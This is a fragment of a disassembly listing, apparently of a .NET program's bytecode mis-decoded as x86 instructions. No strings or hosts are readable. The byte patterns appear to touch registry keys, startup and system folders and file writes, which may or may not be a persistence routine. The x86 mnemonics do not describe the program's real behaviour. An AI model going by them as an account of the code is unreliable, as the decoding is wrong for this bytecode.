  4025b9:	b5 02                	mov    $0x2,%ch
  4025bb:	00 70 6f             	add    %dh,0x6f(%eax)
  4025be:	3a 00                	cmp    (%eax),%al
  4025c0:	00 0a                	add    %cl,(%edx)
  4025c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c3:	24 00                	and    $0x0,%al
  4025c5:	00 0a                	add    %cl,(%edx)
  4025c7:	13 18                	adc    (%eax),%ebx
  4025c9:	11 18                	adc    %ebx,(%eax)
  4025cb:	02 7b 0b             	add    0xb(%ebx),%bh
  4025ce:	00 00                	add    %al,(%eax)
  4025d0:	04 6f                	add    $0x6f,%al
  4025d2:	3b 00                	cmp    (%eax),%eax
  4025d4:	00 0a                	add    %cl,(%edx)
  4025d6:	16                   	push   %ss
  4025d7:	fe 01                	incb   (%ecx)
  4025d9:	13 19                	adc    (%ecx),%ebx
  4025db:	11 19                	adc    %ebx,(%ecx)
  4025dd:	2c 21                	sub    $0x21,%al
  4025df:	00 11                	add    %dl,(%ecx)
  4025e1:	17                   	pop    %ss
  4025e2:	72 a9                	jb     0x40258d
  4025e4:	02 00                	add    (%eax),%al
  4025e6:	70 02                	jo     0x4025ea
  4025e8:	7b 0b                	jnp    0x4025f5
  4025ea:	00 00                	add    %al,(%eax)
  4025ec:	04 72                	add    $0x72,%al
  4025ee:	cf                   	iret
  4025ef:	02 00                	add    (%eax),%al
  4025f1:	70 11                	jo     0x402604
  4025f3:	18 28                	sbb    %ch,(%eax)
  4025f5:	3c 00                	cmp    $0x0,%al
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025fa:	2c 00                	sub    $0x0,%al
  4025fc:	00 0a                	add    %cl,(%edx)
  4025fe:	00 00                	add    %al,(%eax)
  402600:	00 de                	add    %bl,%dh
  402602:	0d 11 17 2c 08       	or     $0x82c1711,%eax
  402607:	11 17                	adc    %edx,(%edi)
  402609:	6f                   	outsl  %ds:(%esi),(%dx)
  40260a:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40260f:	dc 7e 39             	fdivrl 0x39(%esi)
  402612:	00 00                	add    %al,(%eax)
  402614:	0a 72 3d             	or     0x3d(%edx),%dh
  402617:	02 00                	add    (%eax),%al
  402619:	70 17                	jo     0x402632
  40261b:	6f                   	outsl  %ds:(%esi),(%dx)
  40261c:	38 00                	cmp    %al,(%eax)
  40261e:	00 0a                	add    %cl,(%edx)
  402620:	13 1a                	adc    (%edx),%ebx
  402622:	00 11                	add    %dl,(%ecx)
  402624:	1a 72 d3             	sbb    -0x2d(%edx),%dh
  402627:	02 00                	add    (%eax),%al
  402629:	70 72                	jo     0x40269d
  40262b:	e5 02                	in     $0x2,%eax
  40262d:	00 70 6f             	add    %dh,0x6f(%eax)
  402630:	3a 00                	cmp    (%eax),%al
  402632:	00 0a                	add    %cl,(%edx)
  402634:	6f                   	outsl  %ds:(%esi),(%dx)
  402635:	24 00                	and    $0x0,%al
  402637:	00 0a                	add    %cl,(%edx)
  402639:	13 1b                	adc    (%ebx),%ebx
  40263b:	11 1b                	adc    %ebx,(%ebx)
  40263d:	02 7b 0b             	add    0xb(%ebx),%bh
  402640:	00 00                	add    %al,(%eax)
  402642:	04 6f                	add    $0x6f,%al
  402644:	3b 00                	cmp    (%eax),%eax
  402646:	00 0a                	add    %cl,(%edx)
  402648:	16                   	push   %ss
  402649:	fe 01                	incb   (%ecx)
  40264b:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40264e:	1c 2c                	sbb    $0x2c,%al
  402650:	21 00                	and    %eax,(%eax)
  402652:	11 1a                	adc    %ebx,(%edx)
  402654:	72 d3                	jb     0x402629
  402656:	02 00                	add    (%eax),%al
  402658:	70 02                	jo     0x40265c
  40265a:	7b 0b                	jnp    0x402667
  40265c:	00 00                	add    %al,(%eax)
  40265e:	04 72                	add    $0x72,%al
  402660:	cf                   	iret
  402661:	02 00                	add    (%eax),%al
  402663:	70 11                	jo     0x402676
  402665:	1b 28                	sbb    (%eax),%ebp
  402667:	3c 00                	cmp    $0x0,%al
  402669:	00 0a                	add    %cl,(%edx)
  40266b:	6f                   	outsl  %ds:(%esi),(%dx)
  40266c:	2c 00                	sub    $0x0,%al
  40266e:	00 0a                	add    %cl,(%edx)
  402670:	00 00                	add    %al,(%eax)
  402672:	00 de                	add    %bl,%dh
  402674:	0d 11 1a 2c 08       	or     $0x82c1a11,%eax
  402679:	11 1a                	adc    %ebx,(%edx)
  40267b:	6f                   	outsl  %ds:(%esi),(%dx)
  40267c:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402681:	dc 7e 39             	fdivrl 0x39(%esi)
  402684:	00 00                	add    %al,(%eax)
  402686:	0a 72 e7             	or     -0x19(%edx),%dh
  402689:	02 00                	add    (%eax),%al
  40268b:	70 17                	jo     0x4026a4
  40268d:	6f                   	outsl  %ds:(%esi),(%dx)
  40268e:	38 00                	cmp    %al,(%eax)
  402690:	00 0a                	add    %cl,(%edx)
  402692:	13 1d 00 11 1d 14    	adc    0x141d1100,%ebx
  402698:	fe 01                	incb   (%ecx)
  40269a:	13 1e                	adc    (%esi),%ebx
  40269c:	11 1e                	adc    %ebx,(%esi)
  40269e:	2c 10                	sub    $0x10,%al
  4026a0:	7e 39                	jle    0x4026db
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	0a 72 e7             	or     -0x19(%edx),%dh
  4026a7:	02 00                	add    (%eax),%al
  4026a9:	70 6f                	jo     0x40271a
  4026ab:	2b 00                	sub    (%eax),%eax
  4026ad:	00 0a                	add    %cl,(%edx)
  4026af:	26 7e 39             	es jle 0x4026eb
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	0a 72 61             	or     0x61(%edx),%dh
  4026b7:	03 00                	add    (%eax),%eax
  4026b9:	70 6f                	jo     0x40272a
  4026bb:	2b 00                	sub    (%eax),%eax
  4026bd:	00 0a                	add    %cl,(%edx)
  4026bf:	13 1f                	adc    (%edi),%ebx
  4026c1:	00 11                	add    %dl,(%ecx)
  4026c3:	1f                   	pop    %ds
  4026c4:	72 f2                	jb     0x4026b8
  4026c6:	03 00                	add    (%eax),%eax
  4026c8:	70 02                	jo     0x4026cc
  4026ca:	7b 0b                	jnp    0x4026d7
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	04 6f                	add    $0x6f,%al
  4026d0:	2c 00                	sub    $0x0,%al
  4026d2:	00 0a                	add    %cl,(%edx)
  4026d4:	00 11                	add    %dl,(%ecx)
  4026d6:	1f                   	pop    %ds
  4026d7:	72 02                	jb     0x4026db
  4026d9:	04 00                	add    $0x0,%al
  4026db:	70 72                	jo     0x40274f
  4026dd:	12 04 00             	adc    (%eax,%eax,1),%al
  4026e0:	70 6f                	jo     0x402751
  4026e2:	2c 00                	sub    $0x0,%al
  4026e4:	00 0a                	add    %cl,(%edx)
  4026e6:	00 00                	add    %al,(%eax)
  4026e8:	de 0d 11 1f 2c 08    	fimuls 0x82c1f11
  4026ee:	11 1f                	adc    %ebx,(%edi)
  4026f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f1:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4026f6:	dc 00                	faddl  (%eax)
  4026f8:	de 0d 11 1d 2c 08    	fimuls 0x82c1d11
  4026fe:	11 1d 6f 2d 00 00    	adc    %ebx,0x2d6f
  402704:	0a 00                	or     (%eax),%al
  402706:	dc 7e 39             	fdivrl 0x39(%esi)
  402709:	00 00                	add    %al,(%eax)
  40270b:	0a 72 1e             	or     0x1e(%edx),%dh
  40270e:	04 00                	add    $0x0,%al
  402710:	70 17                	jo     0x402729
  402712:	6f                   	outsl  %ds:(%esi),(%dx)
  402713:	38 00                	cmp    %al,(%eax)
  402715:	00 0a                	add    %cl,(%edx)
  402717:	13 20                	adc    (%eax),%esp
  402719:	00 11                	add    %dl,(%ecx)
  40271b:	20 72 80             	and    %dh,-0x80(%edx)
  40271e:	04 00                	add    $0x0,%al
  402720:	70 72                	jo     0x402794
  402722:	e5 02                	in     $0x2,%eax
  402724:	00 70 6f             	add    %dh,0x6f(%eax)
  402727:	3a 00                	cmp    (%eax),%al
  402729:	00 0a                	add    %cl,(%edx)
  40272b:	6f                   	outsl  %ds:(%esi),(%dx)
  40272c:	24 00                	and    $0x0,%al
  40272e:	00 0a                	add    %cl,(%edx)
  402730:	13 21                	adc    (%ecx),%esp
  402732:	11 21                	adc    %esp,(%ecx)
  402734:	02 7b 0b             	add    0xb(%ebx),%bh
  402737:	00 00                	add    %al,(%eax)
  402739:	04 6f                	add    $0x6f,%al
  40273b:	3b 00                	cmp    (%eax),%eax
  40273d:	00 0a                	add    %cl,(%edx)
  40273f:	16                   	push   %ss
  402740:	fe 01                	incb   (%ecx)
  402742:	13 22                	adc    (%edx),%esp
  402744:	11 22                	adc    %esp,(%edx)
  402746:	2c 21                	sub    $0x21,%al
  402748:	00 11                	add    %dl,(%ecx)
  40274a:	20 72 80             	and    %dh,-0x80(%edx)
  40274d:	04 00                	add    $0x0,%al
  40274f:	70 02                	jo     0x402753
  402751:	7b 0b                	jnp    0x40275e
  402753:	00 00                	add    %al,(%eax)
  402755:	04 72                	add    $0x72,%al
  402757:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40275a:	70 11                	jo     0x40276d
  40275c:	21 28                	and    %ebp,(%eax)
  40275e:	3c 00                	cmp    $0x0,%al
  402760:	00 0a                	add    %cl,(%edx)
  402762:	6f                   	outsl  %ds:(%esi),(%dx)
  402763:	2c 00                	sub    $0x0,%al
  402765:	00 0a                	add    %cl,(%edx)
  402767:	00 00                	add    %al,(%eax)
  402769:	00 de                	add    %bl,%dh
  40276b:	0d 11 20 2c 08       	or     $0x82c2011,%eax
  402770:	11 20                	adc    %esp,(%eax)
  402772:	6f                   	outsl  %ds:(%esi),(%dx)
  402773:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402778:	dc 7e 39             	fdivrl 0x39(%esi)
  40277b:	00 00                	add    %al,(%eax)
  40277d:	0a 72 1e             	or     0x1e(%edx),%dh
  402780:	04 00                	add    $0x0,%al
  402782:	70 17                	jo     0x40279b
  402784:	6f                   	outsl  %ds:(%esi),(%dx)
  402785:	38 00                	cmp    %al,(%eax)
  402787:	00 0a                	add    %cl,(%edx)
  402789:	13 23                	adc    (%ebx),%esp
  40278b:	00 11                	add    %dl,(%ecx)
  40278d:	23 72 90             	and    -0x70(%edx),%esi
  402790:	04 00                	add    $0x0,%al
  402792:	70 72                	jo     0x402806
  402794:	e5 02                	in     $0x2,%eax
  402796:	00 70 6f             	add    %dh,0x6f(%eax)
  402799:	3a 00                	cmp    (%eax),%al
  40279b:	00 0a                	add    %cl,(%edx)
  40279d:	6f                   	outsl  %ds:(%esi),(%dx)
  40279e:	24 00                	and    $0x0,%al
  4027a0:	00 0a                	add    %cl,(%edx)
  4027a2:	13 24 11             	adc    (%ecx,%edx,1),%esp
  4027a5:	24 02                	and    $0x2,%al
  4027a7:	7b 0b                	jnp    0x4027b4
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	04 6f                	add    $0x6f,%al
  4027ad:	3b 00                	cmp    (%eax),%eax
  4027af:	00 0a                	add    %cl,(%edx)
  4027b1:	16                   	push   %ss
  4027b2:	fe 01                	incb   (%ecx)
  4027b4:	13 25 11 25 2c 21    	adc    0x212c2511,%esp
  4027ba:	00 11                	add    %dl,(%ecx)
  4027bc:	23 72 90             	and    -0x70(%edx),%esi
  4027bf:	04 00                	add    $0x0,%al
  4027c1:	70 11                	jo     0x4027d4
  4027c3:	24 72                	and    $0x72,%al
  4027c5:	a8 04                	test   $0x4,%al
  4027c7:	00 70 02             	add    %dh,0x2(%eax)
  4027ca:	7b 0b                	jnp    0x4027d7
  4027cc:	00 00                	add    %al,(%eax)
  4027ce:	04 28                	add    $0x28,%al
  4027d0:	3c 00                	cmp    $0x0,%al
  4027d2:	00 0a                	add    %cl,(%edx)
  4027d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d5:	2c 00                	sub    $0x0,%al
  4027d7:	00 0a                	add    %cl,(%edx)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 de                	add    %bl,%dh
  4027dd:	0d 11 23 2c 08       	or     $0x82c2311,%eax
  4027e2:	11 23                	adc    %esp,(%ebx)
  4027e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e5:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4027ea:	dc 7e 29             	fdivrl 0x29(%esi)
  4027ed:	00 00                	add    %al,(%eax)
  4027ef:	0a 72 ac             	or     -0x54(%edx),%dh
  4027f2:	04 00                	add    $0x0,%al
  4027f4:	70 17                	jo     0x40280d
  4027f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f7:	38 00                	cmp    %al,(%eax)
  4027f9:	00 0a                	add    %cl,(%edx)
  4027fb:	13 26                	adc    (%esi),%esp
  4027fd:	00 11                	add    %dl,(%ecx)
  4027ff:	26 14 fe             	es adc $0xfe,%al
  402802:	01 13                	add    %edx,(%ebx)
  402804:	27                   	daa
  402805:	11 27                	adc    %esp,(%edi)
  402807:	2c 10                	sub    $0x10,%al
  402809:	7e 29                	jle    0x402834
  40280b:	00 00                	add    %al,(%eax)
  40280d:	0a 72 ac             	or     -0x54(%edx),%dh
  402810:	04 00                	add    $0x0,%al
  402812:	70 6f                	jo     0x402883
  402814:	2b 00                	sub    (%eax),%eax
  402816:	00 0a                	add    %cl,(%edx)
  402818:	26 7e 29             	es jle 0x402844
  40281b:	00 00                	add    %al,(%eax)
  40281d:	0a 72 ac             	or     -0x54(%edx),%dh
  402820:	04 00                	add    $0x0,%al
  402822:	70 17                	jo     0x40283b
  402824:	6f                   	outsl  %ds:(%esi),(%dx)
  402825:	38 00                	cmp    %al,(%eax)
  402827:	00 0a                	add    %cl,(%edx)
  402829:	13 28                	adc    (%eax),%ebp
  40282b:	00 11                	add    %dl,(%ecx)
  40282d:	28 72 2c             	sub    %dh,0x2c(%edx)
  402830:	05 00 70 02 7b       	add    $0x7b027000,%eax
  402835:	0b 00                	or     (%eax),%eax
  402837:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40283a:	2c 00                	sub    $0x0,%al
  40283c:	00 0a                	add    %cl,(%edx)
  40283e:	00 00                	add    %al,(%eax)
  402840:	de 0d 11 28 2c 08    	fimuls 0x82c2811
  402846:	11 28                	adc    %ebp,(%eax)
  402848:	6f                   	outsl  %ds:(%esi),(%dx)
  402849:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40284e:	dc 00                	faddl  (%eax)
  402850:	de 0d 11 26 2c 08    	fimuls 0x82c2611
  402856:	11 26                	adc    %esp,(%esi)
  402858:	6f                   	outsl  %ds:(%esi),(%dx)
  402859:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40285e:	dc 28                	fsubrl (%eax)
  402860:	3d 00 00 0a 13       	cmp    $0x130a0000,%eax
  402865:	29 12                	sub    %edx,(%edx)
  402867:	29 72 30             	sub    %esi,0x30(%edx)
  40286a:	05 00 70 28 3e       	add    $0x3e287000,%eax
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a 0a                	or     (%edx),%cl
  402873:	7e 39                	jle    0x4028ae
  402875:	00 00                	add    %al,(%eax)
  402877:	0a 72 34             	or     0x34(%edx),%dh
  40287a:	05 00 70 06 28       	add    $0x28067000,%eax
  40287f:	3f                   	aas
  402880:	00 00                	add    %al,(%eax)
  402882:	0a 17                	or     (%edi),%dl
  402884:	6f                   	outsl  %ds:(%esi),(%dx)
  402885:	38 00                	cmp    %al,(%eax)
  402887:	00 0a                	add    %cl,(%edx)
  402889:	13 2a                	adc    (%edx),%ebp
  40288b:	00 11                	add    %dl,(%ecx)
  40288d:	2a 14 fe             	sub    (%esi,%edi,8),%dl
  402890:	01 13                	add    %edx,(%ebx)
  402892:	2b 11                	sub    (%ecx),%edx
  402894:	2b 2c 16             	sub    (%esi,%edx,1),%ebp
  402897:	7e 39                	jle    0x4028d2
  402899:	00 00                	add    %al,(%eax)
  40289b:	0a 72 34             	or     0x34(%edx),%dh
  40289e:	05 00 70 06 28       	add    $0x28067000,%eax
  4028a3:	3f                   	aas
  4028a4:	00 00                	add    %al,(%eax)
  4028a6:	0a 6f 2b             	or     0x2b(%edi),%ch
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	0a 26                	or     (%esi),%ah
  4028ad:	7e 39                	jle    0x4028e8
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	0a 72 34             	or     0x34(%edx),%dh
  4028b4:	05 00 70 06 28       	add    $0x28067000,%eax
  4028b9:	3f                   	aas
  4028ba:	00 00                	add    %al,(%eax)
  4028bc:	0a 17                	or     (%edi),%dl
  4028be:	6f                   	outsl  %ds:(%esi),(%dx)
  4028bf:	38 00                	cmp    %al,(%eax)
  4028c1:	00 0a                	add    %cl,(%edx)
  4028c3:	13 2c 00             	adc    (%eax,%eax,1),%ebp
  4028c6:	11 2c 72             	adc    %ebp,(%edx,%esi,2)
  4028c9:	a0 05 00 70 02       	mov    0x2700005,%al
  4028ce:	7b 0b                	jnp    0x4028db
  4028d0:	00 00                	add    %al,(%eax)
  4028d2:	04 6f                	add    $0x6f,%al
  4028d4:	2c 00                	sub    $0x0,%al
  4028d6:	00 0a                	add    %cl,(%edx)
  4028d8:	00 11                	add    %dl,(%ecx)
  4028da:	2c 72                	sub    $0x72,%al
  4028dc:	b2 05                	mov    $0x5,%dl
  4028de:	00 70 72             	add    %dh,0x72(%eax)
  4028e1:	c2 05 00             	ret    $0x5
  4028e4:	70 6f                	jo     0x402955
  4028e6:	2c 00                	sub    $0x0,%al
  4028e8:	00 0a                	add    %cl,(%edx)
  4028ea:	00 00                	add    %al,(%eax)
  4028ec:	de 0d 11 2c 2c 08    	fimuls 0x82c2c11
  4028f2:	11 2c 6f             	adc    %ebp,(%edi,%ebp,2)
  4028f5:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4028fa:	dc 00                	faddl  (%eax)
  4028fc:	de 0d 11 2a 2c 08    	fimuls 0x82c2a11
  402902:	11 2a                	adc    %ebp,(%edx)
  402904:	6f                   	outsl  %ds:(%esi),(%dx)
  402905:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40290a:	dc 7e 39             	fdivrl 0x39(%esi)
  40290d:	00 00                	add    %al,(%eax)
  40290f:	0a 72 d2             	or     -0x2e(%edx),%dh
  402912:	05 00 70 17 6f       	add    $0x6f177000,%eax
  402917:	38 00                	cmp    %al,(%eax)
  402919:	00 0a                	add    %cl,(%edx)
  40291b:	13 2d 00 11 2d 72    	adc    0x722d1100,%ebp
  402921:	3c 06                	cmp    $0x6,%al
  402923:	00 70 72             	add    %dh,0x72(%eax)
  402926:	e5 02                	in     $0x2,%eax
  402928:	00 70 6f             	add    %dh,0x6f(%eax)
  40292b:	3a 00                	cmp    (%eax),%al
  40292d:	00 0a                	add    %cl,(%edx)
  40292f:	6f                   	outsl  %ds:(%esi),(%dx)
  402930:	24 00                	and    $0x0,%al
  402932:	00 0a                	add    %cl,(%edx)
  402934:	13 2e                	adc    (%esi),%ebp
  402936:	11 2e                	adc    %ebp,(%esi)
  402938:	02 7b 0b             	add    0xb(%ebx),%bh
  40293b:	00 00                	add    %al,(%eax)
  40293d:	04 6f                	add    $0x6f,%al
  40293f:	3b 00                	cmp    (%eax),%eax
  402941:	00 0a                	add    %cl,(%edx)
  402943:	16                   	push   %ss
  402944:	fe 01                	incb   (%ecx)
  402946:	13 2f                	adc    (%edi),%ebp
  402948:	11 2f                	adc    %ebp,(%edi)
  40294a:	2c 21                	sub    $0x21,%al
  40294c:	00 11                	add    %dl,(%ecx)
  40294e:	2d 72 3c 06 00       	sub    $0x63c72,%eax
  402953:	70 02                	jo     0x402957
  402955:	7b 0b                	jnp    0x402962
  402957:	00 00                	add    %al,(%eax)
  402959:	04 72                	add    $0x72,%al
  40295b:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40295e:	70 11                	jo     0x402971
  402960:	2e 28 3c 00          	sub    %bh,%cs:(%eax,%eax,1)
  402964:	00 0a                	add    %cl,(%edx)
  402966:	6f                   	outsl  %ds:(%esi),(%dx)
  402967:	2c 00                	sub    $0x0,%al
  402969:	00 0a                	add    %cl,(%edx)
  40296b:	00 00                	add    %al,(%eax)
  40296d:	11 2d 72 56 06 00    	adc    %ebp,0x65672
  402973:	70 17                	jo     0x40298c
  402975:	8c 3b                	mov    %?,(%ebx)
  402977:	00 00                	add    %al,(%eax)
  402979:	01 1a                	add    %ebx,(%edx)
  40297b:	6f                   	outsl  %ds:(%esi),(%dx)
  40297c:	40                   	inc    %eax
  40297d:	00 00                	add    %al,(%eax)
  40297f:	0a 00                	or     (%eax),%al
  402981:	00 de                	add    %bl,%dh
  402983:	0d 11 2d 2c 08       	or     $0x82c2d11,%eax
  402988:	11 2d 6f 2d 00 00    	adc    %ebp,0x2d6f
  40298e:	0a 00                	or     (%eax),%al
  402990:	dc 1d 28 41 00 00    	fcompl 0x4128
  402996:	0a 0b                	or     (%ebx),%cl
  402998:	1f                   	pop    %ds
  402999:	18 28                	sbb    %ch,(%eax)
  40299b:	41                   	inc    %ecx
  40299c:	00 00                	add    %al,(%eax)
  40299e:	0a 0c 72             	or     (%edx,%esi,2),%cl
  4029a1:	78 06                	js     0x4029a9
  4029a3:	00 70 0d             	add    %dh,0xd(%eax)
  4029a6:	1f                   	pop    %ds
  4029a7:	28 28                	sub    %ch,(%eax)
  4029a9:	41                   	inc    %ecx
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	0a 72 f2             	or     -0xe(%edx),%dh
  4029af:	06                   	push   %es
  4029b0:	00 70 28             	add    %dh,0x28(%eax)
  4029b3:	3f                   	aas
  4029b4:	00 00                	add    %al,(%eax)
  4029b6:	0a 13                	or     (%ebx),%dl
  4029b8:	04 02                	add    $0x2,%al
  4029ba:	07                   	pop    %es
  4029bb:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4029be:	00 06                	add    %al,(%esi)
  4029c0:	00 02                	add    %al,(%edx)
  4029c2:	08 28                	or     %ch,(%eax)
  4029c4:	14 00                	adc    $0x0,%al
  4029c6:	00 06                	add    %al,(%esi)
  4029c8:	00 02                	add    %al,(%edx)
  4029ca:	09 28                	or     %ebp,(%eax)
  4029cc:	14 00                	adc    $0x0,%al
  4029ce:	00 06                	add    %al,(%esi)
  4029d0:	00 02                	add    %al,(%edx)
  4029d2:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4029d5:	14 00                	adc    $0x0,%al
  4029d7:	00 06                	add    %al,(%esi)
  4029d9:	00 02                	add    %al,(%edx)
  4029db:	28 15 00 00 06 00    	sub    %dl,0x60000
  4029e1:	02 28                	add    (%eax),%ch
  4029e3:	16                   	push   %ss
  4029e4:	00 00                	add    %al,(%eax)
  4029e6:	06                   	push   %es
  4029e7:	00 02                	add    %al,(%edx)
  4029e9:	28 17                	sub    %dl,(%edi)
  4029eb:	00 00                	add    %al,(%eax)
  4029ed:	06                   	push   %es
  4029ee:	00 02                	add    %al,(%edx)
  4029f0:	28 18                	sub    %bl,(%eax)
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	06                   	push   %es
  4029f5:	00 02                	add    %al,(%edx)
  4029f7:	28 19                	sub    %bl,(%ecx)
  4029f9:	00 00                	add    %al,(%eax)
  4029fb:	06                   	push   %es
  4029fc:	00 7e 39             	add    %bh,0x39(%esi)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 72 70             	or     0x70(%edx),%dh
  402a04:	07                   	pop    %es
  402a05:	00 70 17             	add    %dh,0x17(%eax)
  402a08:	6f                   	outsl  %ds:(%esi),(%dx)
  402a09:	38 00                	cmp    %al,(%eax)
  402a0b:	00 0a                	add    %cl,(%edx)
  402a0d:	13 30                	adc    (%eax),%esi
  402a0f:	00 11                	add    %dl,(%ecx)
  402a11:	30 14 fe             	xor    %dl,(%esi,%edi,8)
  402a14:	03 13                	add    (%ebx),%edx
  402a16:	31 11                	xor    %edx,(%ecx)
  402a18:	31 2c 15 00 11 30 72 	xor    %ebp,0x72301100(,%edx,1)
  402a1f:	ba 07 00 70 02       	mov    $0x2700007,%edx
  402a24:	7b 0b                	jnp    0x402a31
  402a26:	00 00                	add    %al,(%eax)
  402a28:	04 6f                	add    $0x6f,%al
  402a2a:	2c 00                	sub    $0x0,%al
  402a2c:	00 0a                	add    %cl,(%edx)
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	00 de                	add    %bl,%dh
  402a32:	0d 11 30 2c 08       	or     $0x82c3011,%eax
  402a37:	11 30                	adc    %esi,(%eax)
  402a39:	6f                   	outsl  %ds:(%esi),(%dx)
  402a3a:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402a3f:	dc 1f                	fcompl (%edi)
  402a41:	24 28                	and    $0x28,%al
  402a43:	41                   	inc    %ecx
  402a44:	00 00                	add    %al,(%eax)
  402a46:	0a 72 ca             	or     -0x36(%edx),%dh
  402a49:	07                   	pop    %es
  402a4a:	00 70 28             	add    %dh,0x28(%eax)
  402a4d:	42                   	inc    %edx
  402a4e:	00 00                	add    %al,(%eax)
  402a50:	0a 13                	or     (%ebx),%dl
  402a52:	05 11 05 28 43       	add    $0x43280511,%eax
  402a57:	00 00                	add    %al,(%eax)
  402a59:	0a 13                	or     (%ebx),%dl
  402a5b:	32 11                	xor    (%ecx),%dl
  402a5d:	32 2c 3f             	xor    (%edi,%edi,1),%ch
  402a60:	00 11                	add    %dl,(%ecx)
  402a62:	05 1b 8d 33 00       	add    $0x338d1b,%eax
  402a67:	00 01                	add    %al,(%ecx)
  402a69:	25 16 72 da 07       	and    $0x7da7216,%eax
  402a6e:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a71:	25 17 02 7b 0b       	and    $0xb7b0217,%eax
  402a76:	00 00                	add    %al,(%eax)
  402a78:	04 a2                	add    $0xa2,%al
  402a7a:	25 18 72 00 08       	and    $0x8007218,%eax
  402a7f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a82:	25 19 02 7b 0b       	and    $0xb7b0219,%eax
  402a87:	00 00                	add    %al,(%eax)
  402a89:	04 a2                	add    $0xa2,%al
  402a8b:	25 1a 72 0e 08       	and    $0x80e721a,%eax
  402a90:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a93:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402a97:	0a 28                	or     (%eax),%ch
  402a99:	45                   	inc    %ebp
  402a9a:	00 00                	add    %al,(%eax)
  402a9c:	0a 00                	or     (%eax),%al
  402a9e:	00 1f                	add    %bl,(%edi)
  402aa0:	24 28                	and    $0x28,%al
  402aa2:	41                   	inc    %ecx
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	0a 72 14             	or     0x14(%edx),%dh
  402aa8:	08 00                	or     %al,(%eax)
  402aaa:	70 28                	jo     0x402ad4
  402aac:	42                   	inc    %edx
  402aad:	00 00                	add    %al,(%eax)
  402aaf:	0a 13                	or     (%ebx),%dl
  402ab1:	06                   	push   %es
  402ab2:	11 06                	adc    %eax,(%esi)
  402ab4:	28 43 00             	sub    %al,0x0(%ebx)
  402ab7:	00 0a                	add    %cl,(%edx)
  402ab9:	13 33                	adc    (%ebx),%esi
  402abb:	11 33                	adc    %esi,(%ebx)
  402abd:	2c 1f                	sub    $0x1f,%al
  402abf:	00 11                	add    %dl,(%ecx)
  402ac1:	06                   	push   %es
  402ac2:	72 2a                	jb     0x402aee
  402ac4:	08 00                	or     %al,(%eax)
  402ac6:	70 02                	jo     0x402aca
  402ac8:	7b 0b                	jnp    0x402ad5
  402aca:	00 00                	add    %al,(%eax)
  402acc:	04 72                	add    $0x72,%al
  402ace:	0e                   	push   %cs
  402acf:	08 00                	or     %al,(%eax)
  402ad1:	70 28                	jo     0x402afb
  402ad3:	3c 00                	cmp    $0x0,%al
  402ad5:	00 0a                	add    %cl,(%edx)
  402ad7:	28 45 00             	sub    %al,0x0(%ebp)
  402ada:	00 0a                	add    %cl,(%edx)
  402adc:	00 00                	add    %al,(%eax)
  402ade:	1f                   	pop    %ds
  402adf:	24 28                	and    $0x28,%al
  402ae1:	41                   	inc    %ecx
  402ae2:	00 00                	add    %al,(%eax)
  402ae4:	0a 72 52             	or     0x52(%edx),%dh
  402ae7:	08 00                	or     %al,(%eax)
  402ae9:	70 28                	jo     0x402b13
  402aeb:	42                   	inc    %edx
  402aec:	00 00                	add    %al,(%eax)
  402aee:	0a 13                	or     (%ebx),%dl
  402af0:	07                   	pop    %es
  402af1:	11 07                	adc    %eax,(%edi)
  402af3:	28 43 00             	sub    %al,0x0(%ebx)
  402af6:	00 0a                	add    %cl,(%edx)
  402af8:	13 34 11             	adc    (%ecx,%edx,1),%esi
  402afb:	34 2c                	xor    $0x2c,%al
  402afd:	40                   	inc    %eax
  402afe:	00 11                	add    %dl,(%ecx)
  402b00:	07                   	pop    %es
  402b01:	28 46 00             	sub    %al,0x0(%esi)
  402b04:	00 0a                	add    %cl,(%edx)
  402b06:	13 35 11 35 02 7b    	adc    0x7b023511,%esi
  402b0c:	0b 00                	or     (%eax),%eax
  402b0e:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402b11:	3b 00                	cmp    (%eax),%eax
  402b13:	00 0a                	add    %cl,(%edx)
  402b15:	16                   	push   %ss
  402b16:	fe 01                	incb   (%ecx)
  402b18:	13 36                	adc    (%esi),%esi
  402b1a:	11 36                	adc    %esi,(%esi)
  402b1c:	2c 1f                	sub    $0x1f,%al
  402b1e:	00 11                	add    %dl,(%ecx)
  402b20:	07                   	pop    %es
  402b21:	72 0e                	jb     0x402b31
  402b23:	08 00                	or     %al,(%eax)
  402b25:	70 02                	jo     0x402b29
  402b27:	7b 0b                	jnp    0x402b34
